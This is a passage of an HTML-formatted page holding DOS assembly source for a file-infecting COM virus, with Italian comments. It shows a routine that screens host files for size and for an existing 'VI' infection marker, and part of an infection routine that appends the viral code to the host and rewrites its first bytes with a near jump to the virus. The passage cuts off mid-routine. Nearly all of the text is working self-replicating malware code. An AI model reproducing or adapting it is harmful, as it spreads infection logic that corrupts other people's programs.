<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov ah,4FH<span
style="mso-spacerun: yes">                         </span>;non e' un file
valido, cerco ancora <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>int 21H<span style="mso-spacerun: yes">                        </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>jmp
TROVA_LOOP<span style="mso-spacerun: yes">                    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>TROVA_FATTO: <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>ret <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;**********************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; FILE_OK<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; determina se il file COM specificato da FNAME e' utilizzabile<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; se e' buono torna z=1, atrimenti z=0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; Un file utilizzabile: <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; a) deve avere abbastanza spazio per appendergli<span
style="mso-spacerun: yes">  </span>il virus senza eccedere i 64 K; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; b) i Bytes 0, 3 e 4 del file non devono essere un near jump, e
'V','I' <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;**********************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>FILE_OK: <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
dx,OFFSET FNAME<span style="mso-spacerun: yes">            </span>;apro il file
in r/w<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
ax,3D02H<span style="mso-spacerun: yes">                   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>int
21H <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>jc FOK_NZEND<span
style="mso-spacerun: yes">                   </span>;errore in apertura - il
file non e' buono <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; il file e' buono<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov bx,ax<span
style="mso-spacerun: yes">                      </span>;metto l'handle in bx <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>push bx <span
style="mso-spacerun: yes">                       </span>;e lo salvo nello stack
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov cx,5<span
style="mso-spacerun: yes">                       </span>;leggo i primi 5 bytes
all'inizio del COM <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov dx,OFFSET START_IMAGE<span style="mso-spacerun: yes">      </span>;e
li salvo in START_IMAGE <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
ah,3FH<span style="mso-spacerun: yes">                     </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>int
21H <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>pop bx<span
style="mso-spacerun: yes">                      </span><span
style="mso-spacerun: yes">   </span>;ripristino bx (l'handle del file)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov ah,3EH<span
style="mso-spacerun: yes">                     </span>;chiudo il file<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>int 21H<span
style="mso-spacerun: yes">                        </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes"> </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;controllo la dimensione utile utilizzando il flag di overflow<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov ax,WORD PTR
[FSIZE]<span style="mso-spacerun: yes">                </span>;in ax la misura del
fil host <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>add ax,OFFSET
FINEVIRUS ­ OFFSET VIRUS ;aggiungo la misura del virus <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>jc FOK_NZEND<span
style="mso-spacerun: yes">                           </span>;se carry=1,
overflow (&gt;64K) esco con <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun:
yes">                                             </span>;z=0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>cmp BYTE PTR
[START_IMAGE],0E9H<span style="mso-spacerun: yes">       </span>;misura ok ­ il
primo byte e' un near <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun:
yes">                                            </span>;jmp ?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>jnz FOK_ZEND<span
style="mso-spacerun: yes">                          </span>;flag z non zero, si
puo' infettare <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>cmp WORD PTR [START_IMAGE+3],4956H<span style="mso-spacerun: yes">   
</span>;ok, nei bytes 3 e 4 c'e' 'VI' ? <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>jnz FOK_ZEND<span
style="mso-spacerun: yes">     </span><span style="mso-spacerun:
yes">                     </span>;flag z non zero, no si puo' infettare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>FOK_NZEND:<span style="mso-spacerun:
yes">                                  </span>;non trovato file buono<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov al,1<span
style="mso-spacerun: yes">                              </span>;non infettare
il file (al=1,flag zero=0) <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>or al,al<span
style="mso-spacerun: yes">                              </span>;ritorno con
flag z=0 <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>ret <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>FOK_ZEND:<span style="mso-spacerun:
yes">                                   </span>;trovato un file buono (al=0,
flag zero=1)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>xor al,al<span
style="mso-spacerun: yes">                             </span>;ok infettiamo,
torna con z=1 <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>ret <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;**********************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; INFETTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; copia il codice virale alla fine del file COM (append)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; agiusta i primi 5 bytes del programma e i primi 5 bytes in
memoria<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;**********************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>INFETTA: <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov dx,OFFSET
FNAME<span style="mso-spacerun: yes">                   </span>;apro il file in
r/w <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov ax,3D02H<span style="mso-spacerun: yes">                          
</span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>int
21H <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
WORD PTR [HANDLE],ax<span style="mso-spacerun: yes">              </span>;savo
l'handle <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>xor cx,cx<span
style="mso-spacerun: yes">                             </span>;pulisco cx per
il puntatore<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov dx,cx<span
style="mso-spacerun: yes">           </span><span style="mso-spacerun:
yes">                  </span>;posizione del puntatore al file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun:
yes">                                            </span>;cx:dx = puntatore = 0 <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov bx,WORD PTR [HANDLE] <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>mov ax,4202H<span
style="mso-spacerun: yes">                          </span>;puntatore alla fine
del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>int 21H <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov cx,OFFSET
ULTIMO_BYTE ­ OFFSET VIRUS<span style="mso-spacerun: yes">    </span>;ora
scrivo il codice virus, <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun:
yes">                                                  </span>;cx=numero bytes <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov
dx,[VIR_START]<span style="mso-spacerun: yes">                         
</span>;ds:dx = locazione in memoria da <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun:
yes">                                                  </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>;cui copio <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
bx,WORD PTR [HANDLE]<span style="mso-spacerun: yes">                   
</span>;bx = file handle <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>mov ah,40H<span
style="mso-spacerun: yes">                                  </span>;scrivo <span
style='mso-tab-count:1'> </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>int 21H <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; ora devo salvare i primi 5 bytes e memorizzati in START_IMAGE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; prima di tutto posiziono il puntatore dove c'e' INIZIO_CODICE nel
nuovo virus <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>xor cx,cx<span style="mso-spacerun: yes">                            
</span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
dx,WORD PTR [FSIZE]<span style="mso-spacerun: yes">               </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>add
dx,OFFSET INIZIO_CODICE ­ OFFSET VIRUS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
bx,WORD PTR [HANDLE]<span style="mso-spacerun: yes">              </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>mov ax,4200H<span
style="mso-spacerun: yes">                          </span>; posiziono il
puntatore<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>int 21H <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov cx,5<span
style="mso-spacerun: yes">                              </span>;scrivo
INIZIO_CODICE nel file <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov bx,WORD PTR
[HANDLE]<span style="mso-spacerun: yes">              </span>;dati che ho
ottenuto durante <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov dx,OFFSET
START_IMAGE<span style="mso-spacerun: yes">             </span>;la funzione
FILE_OK e memorizzati <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov ah,40H<span style="mso-spacerun: yes">                           
</span>;in START_IMAGE <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>int 21H <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; ora torno all'inizio dell'host per scrivere l'istruzione di
salto <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>xor cx,cx<span style="mso-spacerun: yes">                            
</span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
dx,cx<span style="mso-spacerun: yes">                              </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
bx,WORD PTR [HANDLE] <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>mov ax,4200H<span
style="mso-spacerun: yes">                          </span>;posiziono il
puntatore<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>int 21H <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; preparo il codice dell'istruzione di salto e degli altri bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov
bx,[VIR_START]<span style="mso-spacerun: yes">                       
</span>;calcolo la locazione del jump<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov BYTE PTR
[START_IMAGE],0E9H<span style="mso-spacerun: yes">           </span>;il codice
per un near jump e' E9 <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov ax,WORD PTR
[FSIZE]<span style="mso-spacerun: yes">                   </span>;e il relativo
indirizzo <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>add ax,OFFSET INIZIO_VIRUS­OFFSET VIRUS­3 ;questi vanno a START_IMAGE <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
WORD PTR [START_IMAGE+1],ax <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
WORD PTR [START_IMAGE+3],4956H<span style="mso-spacerun: yes">        </span>;e
ci metto 'VI' <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>; ok scrivo i 5 bytes di START_IMAGE<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
cx,5<span style="mso-spacerun: yes">                              </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
dx,OFFSET START_IMAGE<span style="mso-spacerun: yes">             </span>;ds:dx
= puntatore a START_IMAGE <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
bx,WORD PTR [HANDLE]<span style="mso-spacerun: yes">              </span>;file
handle <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>mov
ah,40H<span style="mso-spacerun: yes">                            </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
